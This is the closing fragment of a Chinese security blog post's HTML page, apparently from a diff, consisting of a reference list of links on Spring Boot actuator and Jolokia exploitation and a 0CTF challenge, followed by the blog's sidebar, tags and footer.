+<h2 id="0X03-参考链接"><a href="#0X03-参考链接" class="headerlink" title="0X03 参考链接"></a><strong>0X03 参考链接</strong></h2><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a><br><a href="https://www.lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/" target="_blank" rel="noopener">https://www.lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/</a><br><a href="https://www.freebuf.com/vuls/166695.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/166695.html</a><br><a href="https://jolokia.org/reference/html/protocol.html#request-response" target="_blank" rel="noopener">https://jolokia.org/reference/html/protocol.html#request-response</a><br><a href="https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw</a><br><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/" target="_blank" rel="noopener">https://blog.trendmicro.com/trendlabs-security-intelligence/new-headaches-how-the-pawn-storm-zero-day-evaded-javas-click-to-play-protection/</a><br><a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi" target="_blank" rel="noopener">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a><br><a href="http://baijiahao.baidu.com/s?id=1600246970563166864&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">http://baijiahao.baidu.com/s?id=1600246970563166864&amp;wfr=spider&amp;for=pc</a><br><a href="https://www.ibm.com/developerworks/cn/java/j-lo-osgi/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/j-lo-osgi/index.html</a><br><a href="https://www.cnblogs.com/dongguacai/p/5900507.html" target="_blank" rel="noopener">https://www.cnblogs.com/dongguacai/p/5900507.html</a><br><a href="https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/" target="_blank" rel="noopener">https://www.lucifaer.com/2019/03/11/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%201/</a><br><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a><br><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
+</div><div class="tags"><a href="/tags/CTF/">CTF</a></div><div class="post-nav"><a class="pre" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a><a class="next" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categorías</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Etiquetas</i></div><div class="tagcloud"><a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recientes</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Blogroll</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
